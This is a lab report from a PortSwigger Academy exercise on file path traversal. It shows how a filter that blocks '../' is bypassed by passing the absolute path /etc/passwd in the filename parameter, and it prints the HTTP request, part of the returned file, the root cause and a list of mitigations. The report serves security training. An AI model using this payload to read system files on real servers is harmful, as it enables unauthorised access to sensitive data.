# Lab Report: File Path Traversal (Absolute Path Bypass)

## Overview
This lab demonstrates a **File Path Traversal vulnerability** where traversal sequences such as `../` are blocked.  
However, the application can still be exploited using **absolute file paths**, allowing unauthorized access to sensitive system files.  

The goal of this lab was to retrieve the contents of the `/etc/passwd` file.

---

## Steps to Exploitation

### 1. Initial Request
The application used a request parameter `filename` to fetch image files.  
An attempt with relative traversal (`../../../../etc/passwd`) was blocked.  

### 2. Absolute Path Injection
Instead of relative traversal, the payload was modified to include an **absolute path**:  

```http
GET /image?filename=/etc/passwd HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<valid-session-cookie>
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,*/*
```

### 3. Server Response
The server returned the contents of `/etc/passwd`, proving successful exploitation:

```plaintext
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

---

## Evidence

### Exploit Request and Response
![Exploit Request and Response](/images/File-path-traversal-1.jpg)

### Lab Solved Confirmation
![Lab Solved](/images/File-path-traversal-2-lab-solved.jpg)

---

## Result
- Retrieved sensitive system file: `/etc/passwd`  
- Confirmed path traversal vulnerability with absolute path bypass  
- Lab status:  
  ✅ *"Congratulations, you solved the lab!"*

---

## Root Cause
- Application filtered relative traversal sequences (`../`) but failed to validate **absolute paths**.  
- No canonicalization or whitelist-based validation of file paths was performed.  

---

## Mitigation
1. **Use Whitelisting** – Restrict file access to specific directories and predefined filenames.  
2. **Canonicalization** – Normalize file paths before usage to remove traversal attempts.  
3. **Avoid Direct File References** – Use indirect object references (IDs) instead of filenames in user input.  
4. **Input Validation** – Reject dangerous characters and sequences in user-supplied input.  

---

## Skills Demonstrated
- Testing for path traversal vulnerabilities  
- Bypassing filters using absolute path injection  
- Retrieving sensitive files from the server (`/etc/passwd`)  
- Confirming exploitation with Burp Suite evidence  

---

## References
- [PortSwigger Academy: File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)  
- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)  
